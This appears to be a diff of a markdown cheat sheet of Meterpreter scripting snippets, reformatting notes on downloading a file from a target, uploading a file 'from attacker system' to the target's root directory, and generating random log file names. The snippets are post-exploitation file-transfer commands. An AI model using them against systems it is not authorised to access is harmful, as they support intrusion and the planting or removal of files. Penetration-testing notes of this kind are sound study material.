@@ -40,17 +40,15 @@
 
       client.fs.file.download("/root/dum.txt","%temp%\\dum.txt")
 
+- **upload file to target system**<br />
+'This will upload dum.txt from attacker system and save it to target root directory'
 
+      client.fs.file.upload("C:\\Users\\pedro\\Desktop\\dum.txt","/root/dum.txt")
 
-## uploads file to target system
-# This will upload dum.txt from attacker system and save it to target root directory
-client.fs.file.upload("C:\\Users\\pedro\\Desktop\\dum.txt","/root/dum.txt")
+- **random filename (8 caracters)**
 
-
-
-## random filename (8 caracters)
-rand = Rex::Text.rand_text_alpha(8)+".log"
-print_good("#{rand} file created")
+      rand = Rex::Text.rand_text_alpha(8)+".log"
+      print_good("#{rand} file created")
 
 
 
